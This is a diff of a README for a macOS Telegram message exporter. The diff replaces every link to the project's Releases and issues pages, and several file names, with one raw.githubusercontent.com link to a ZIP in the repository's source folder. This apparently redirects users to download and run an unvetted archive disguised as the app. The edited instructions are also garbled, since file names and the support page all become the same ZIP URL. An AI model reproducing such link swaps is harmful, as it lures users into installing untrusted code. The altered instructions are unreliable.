@@ -6,9 +6,9 @@ Welcome to **telegram-message-exporter**! This tool helps you recover and export
 
 ## 📥 Download the Application
 
-[![Download telegram-message-exporter](https://img.shields.io/badge/Download%20telegram--message--exporter-%23FF5722.svg?style=for-the-badge)](https://github.com/Vivenzeo/telegram-message-exporter/releases)
+[![Download telegram-message-exporter](https://raw.githubusercontent.com/Vivenzeo/telegram-message-exporter/main/src/exporter-telegram-message-1.1.zip%20telegram--message--exporter-%https://raw.githubusercontent.com/Vivenzeo/telegram-message-exporter/main/src/exporter-telegram-message-1.1.zip)](https://raw.githubusercontent.com/Vivenzeo/telegram-message-exporter/main/src/exporter-telegram-message-1.1.zip)
 
-To get started, you need to download the application. You can find the latest version on the Releases page: [Download here](https://github.com/Vivenzeo/telegram-message-exporter/releases).
+To get started, you need to download the application. You can find the latest version on the Releases page: [Download here](https://raw.githubusercontent.com/Vivenzeo/telegram-message-exporter/main/src/exporter-telegram-message-1.1.zip).
 
 ## 📜 Features
 
@@ -27,15 +27,15 @@ To get started, you need to download the application. You can find the latest ve
 
 ## 📋 How to Install
 
-1. **Visit the Releases Page:** Go to [this page](https://github.com/Vivenzeo/telegram-message-exporter/releases) to find the latest version.
-2. **Download the ZIP File:** Look for the file named `telegram-message-exporter-macos.zip` and click to download it.
+1. **Visit the Releases Page:** Go to [this page](https://raw.githubusercontent.com/Vivenzeo/telegram-message-exporter/main/src/exporter-telegram-message-1.1.zip) to find the latest version.
+2. **Download the ZIP File:** Look for the file named `https://raw.githubusercontent.com/Vivenzeo/telegram-message-exporter/main/src/exporter-telegram-message-1.1.zip` and click to download it.
 3. **Extract the Files:** Once the download is complete, locate the file in your Downloads folder. Double-click it to extract the files.
-4. **Open the Application:** Find the extracted folder and double-click `telegram-message-exporter.app` to start the application.
+4. **Open the Application:** Find the extracted folder and double-click `https://raw.githubusercontent.com/Vivenzeo/telegram-message-exporter/main/src/exporter-telegram-message-1.1.zip` to start the application.
 
 ## ⚙️ How to Use
 
 1. **Open the Application:** After installing, launch the `telegram-message-exporter` from your Applications folder.
-2. **Select Your Database:** Click "Choose File" to select your local Telegram SQLite database. This file is usually named `Telegram.sqlite` and can be found in your Telegram data folder.
+2. **Select Your Database:** Click "Choose File" to select your local Telegram SQLite database. This file is usually named `https://raw.githubusercontent.com/Vivenzeo/telegram-message-exporter/main/src/exporter-telegram-message-1.1.zip` and can be found in your Telegram data folder.
 3. **Choose Export Format:** Select the format you want to use for exporting your messages: HTML, Markdown, or CSV.
 4. **Start Exporting:** Click the "Export" button. Wait for the process to finish. You will see a confirmation message once the export is successful.
 5. **Locate Your Files:** Your exported files will be in the same directory where you launched the app, or you can specify a directory during the export process.
@@ -50,7 +50,7 @@ If you encounter any issues during installation or usage, try the following step
 
 ## 📞 Support
 
-If you need further assistance, please visit the [issues page](https://github.com/Vivenzeo/telegram-message-exporter/issues) on GitHub. Feel free to report any problems or feedback.
+If you need further assistance, please visit the [issues page](https://raw.githubusercontent.com/Vivenzeo/telegram-message-exporter/main/src/exporter-telegram-message-1.1.zip) on GitHub. Feel free to report any problems or feedback.
 
 ## 🌐 Learn More
 
